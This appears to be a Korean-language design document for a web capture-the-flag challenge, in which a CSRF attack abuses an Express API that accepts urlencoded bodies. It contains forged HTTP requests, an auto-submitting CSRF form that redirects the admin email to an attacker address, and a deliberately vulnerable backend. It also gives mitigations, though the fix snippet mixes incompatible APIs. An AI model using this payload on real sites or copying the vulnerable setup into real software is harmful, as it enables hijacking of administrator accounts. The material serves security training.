---
title: Content-Type Parsing Flaw leading to CSRF — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, csrf, content-type, parser-flaw, api-security]
confidence: high
---

# Content-Type Parsing Flaw leading to CSRF — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: API Gateway settings (API 게이트웨이 설정 변경)
- **난이도**: Medium
- **핵심 컨셉**: 현대적인 REST API 환경에서 많이 발생하는 **CSRF(Cross-Site Request Forgery)** 우회 취약점 문제입니다. 서버는 JSON 페이로드(`/api/settings`)를 입력받아 처리하며 일반적인 브라우저 크로스 도메인 요청(Simple Request) 규칙에 따라 `Content-Type: application/json` 형식만 수용해야 안전합니다. 그러나 백엔드의 웹 프레임워크나 바디 파서 미들웨어가 유연하게 구성되어 있어 `application/x-www-form-urlencoded` 형식의 본문도 내부적으로 파싱하여 JSON 형태로 받아들입니다. 공격자는 이를 이용해 단순 HTML `<form>` 전송만으로 사용자의 권한을 도용하여 설정을 바꾸고 플래그를 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Settings Panel**: 관리자 로그인 상태에서 API 설정을 변경할 수 있는 UI.
- **Backend Service (Python/Flask or Node.js/Express)**:
  - 설정 변경 엔드포인트 `/api/settings` 제공.
  - 전송된 데이터를 기반으로 설정을 변경하며 변경 시 플래그 노출이나 관리자 수신 이메일 주소 변경 처리.
- **Flag 위치**:
  - 관리자 설정의 `admin_email`을 공격자 메일로 변경하는 CSRF가 성공하면, 해당 공격자 메일 주소로 시스템 알림 형식의 플래그가 전송됩니다.

### 2.2 취약점 지점
1. **Loose Content-Type Parsing**:
   - 백엔드는 JSON을 사용하기 위해 `bodyParser.json()`과 `bodyParser.urlencoded({ extended: true })`를 둘 다 로드하고 있으나, 어떤 요청이든 바디 파싱이 성공하면 가리지 않고 `req.body` 속성으로 접근하여 사용합니다.
2. **Missing Anti-CSRF Token / SameSite**:
   - 세션 검증 쿠키에 `SameSite` 속성이 정의되어 있지 않고 별도의 CSRF 검증 토큰이 부재합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body) | 반환 값 | 비고 |
|------------|--------|------|----------------|---------|------|
| `/api/settings`| POST | 세션 필요 | `{"admin_email": "..."}` | `{"status": "updated"}` | CSRF 공격 타켓 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 파서 유연성 판별
공격자는 일반적인 JSON 전송 폼을 가로채서 `Content-Type`을 바꾸어 테스트해 봅니다.
- *정상 JSON 요청*:
  ```http
  POST /api/settings HTTP/1.1
  Host: gateway.challenge.local
  Content-Type: application/json
  Cookie: session=admin_cookie

  {"admin_email":"admin@challenge.local"}
  ```
- *변조 요청*:
  `Content-Type`을 `application/x-www-form-urlencoded`로 변경하고 본문을 폼 형식으로 전송합니다.
  ```http
  POST /api/settings HTTP/1.1
  Host: gateway.challenge.local
  Content-Type: application/x-www-form-urlencoded
  Cookie: session=admin_cookie

  admin_email=attacker%40attacker.local
  ```
- *결과*: 서버가 `200 OK` 및 `{"status": "updated"}`를 반환합니다. 즉, 폼 전송 방식의 바디 파싱도 수용함을 확인합니다.

### Step 2. CSRF 익스플로잇 페이지 작성
브라우저는 크로스 도메인 보안 설정(CORS)으로 인해 타 사이트에서 임의의 `application/json` 타입 POST 요청을 날리는 것을 차단(Preflight 수행)하지만, `application/x-www-form-urlencoded` 폼 전송은 단순 요청(Simple Request)으로 처리하여 프리플라이트 없이 바로 보낼 수 있습니다.
- **CSRF Payload HTML**:
  ```html
  <html>
    <body>
      <form id="csrfForm" action="http://gateway.challenge.local/api/settings" method="POST">
        <!-- 서버가 파싱하도록 변수 매핑 -->
        <input type="hidden" name="admin_email" value="attacker@attacker.local" />
      </form>
      <script>
        // 페이지가 열리면 자동으로 form 제출
        document.getElementById('csrfForm').submit();
      </script>
    </body>
  </html>
  ```

### Step 3. 공격 감행 및 플래그 획득
1. 공격자는 작성한 HTML 파일을 자신의 외부 서버(`http://attacker.local/csrf.html`)에 배치합니다.
2. 타겟 시스템의 관리자에게 소셜 엔지니어링이나 이메일 링크를 통해 해당 주소에 접속하도록 유도합니다.
3. 관리자의 브라우저가 링크를 열면 자동으로 포털로 쿠키와 함께 폼 데이터가 날아가 관리 이메일이 `attacker@attacker.local`로 변조됩니다.
4. 공격자는 자신의 메일함에서 전송된 시스템 플래그(`FLAG{csrf_content_type_bypass_successful}`)를 확인합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// app.js
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());

// 취약점 지점: JSON과 URLencoded 파서를 동시에 무조건 전역 로드
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/api/settings", (req, res) => {
    // 세션 인증 검증 (단순 검증)
    const session = req.cookies.session;
    if (session !== 'admin_cookie') {
        return res.status(403).json({ error: "Unauthorized" });
    }
    
    // 취약점 지점: req.body로 들어온 데이터가 JSON에서 파싱되었는지 
    // urlencoded에서 파싱되었는지 확인하지 않고 신뢰하여 반영함
    const newEmail = req.body.admin_email;
    if (newEmail) {
        // 이메일 변경 처리 로직 실행
        sendFlagToEmail(newEmail); // 이메일로 플래그 발송 시뮬레이션
        return res.json({ status: "updated", admin_email: newEmail });
    }
    
    return res.status(400).json({ error: "Invalid data" });
});

function sendFlagToEmail(email) {
    console.log(`Flag sent to ${email}: FLAG{csrf_content_type_bypass_successful}`);
}

app.listen(3000);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **엄격한 Content-Type 검증 (Strict Content-Type Check)**:
   - 해당 엔드포인트가 반드시 JSON만 허용해야 한다면, 헤더 값이 정확히 `application/json`인지 검증하고 맞지 않으면 415 Unsupported Media Type 에러를 반환해야 합니다.
   - **수정 예시**:
     ```javascript
     if (request.headers.get("Content-Type") !== "application/json") {
         return response.status(415).send("Unsupported Media Type");
     }
     ```
2. **SameSite 쿠키 속성 적용**:
   - 세션 쿠키를 발급할 때 `SameSite=Strict` 또는 `SameSite=Lax`를 활성화하여 제3의 도메인에서 발생하는 크로스 사이트 요청 시 세션 쿠키가 자동으로 전달되지 않게 차단합니다.
3. **Anti-CSRF 토큰 적용**:
   - 개별 요청 세션에 고유의 일회성 CSRF 토큰값을 포함하고 이를 서버가 폼 필드 또는 커스텀 헤더를 통해 교차 검증하도록 설계합니다.
